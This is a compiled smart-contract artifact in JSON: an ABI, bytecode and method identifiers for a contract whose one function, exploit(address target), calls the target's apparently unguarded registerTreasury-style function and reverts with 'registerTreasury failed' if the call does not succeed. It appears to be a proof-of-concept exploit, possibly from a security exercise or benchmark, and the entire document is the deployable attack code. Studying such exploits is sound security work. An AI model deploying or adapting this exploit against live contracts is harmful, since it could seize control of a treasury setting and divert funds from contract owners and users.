{"abi":[{"type":"function","name":"exploit","inputs":[{"name":"target","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b506102288061001c5f395ff3fe608060405234801561000f575f5ffd5b5060043610610029575f3560e01c80630aeb4ddf1461002d575b5f5ffd5b61004061003b36600461018c565b610042565b005b6040515f602482018190529060440160408051601f198184030181529181526020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff167f211c85ab000000000000000000000000000000000000000000000000000000001790526101006024830152519091505f9073ffffffffffffffffffffffffffffffffffffffff8416906100da9084906101c6565b5f604051808303815f865af19150503d805f8114610113576040519150601f19603f3d011682016040523d82523d5f602084013e610118565b606091505b5050905080610187576040517f08c379a000000000000000000000000000000000000000000000000000000000815260206004820152601760248201527f72656769737465725472656173757279206661696c6564000000000000000000604482015260640160405180910390fd5b505050565b5f6020828403121561019c575f5ffd5b813573ffffffffffffffffffffffffffffffffffffffff811681146101bf575f5ffd5b9392505050565b5f82515f5b818110156101e557602081860181015185830152016101cb565b505f92019182525091905056fea2646970667358221220d373316b60e8f90cc180b486494e179a2e922745328424d2e8510c43f23340e264736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"exploit(address)":"0aeb4ddf"},"id":0}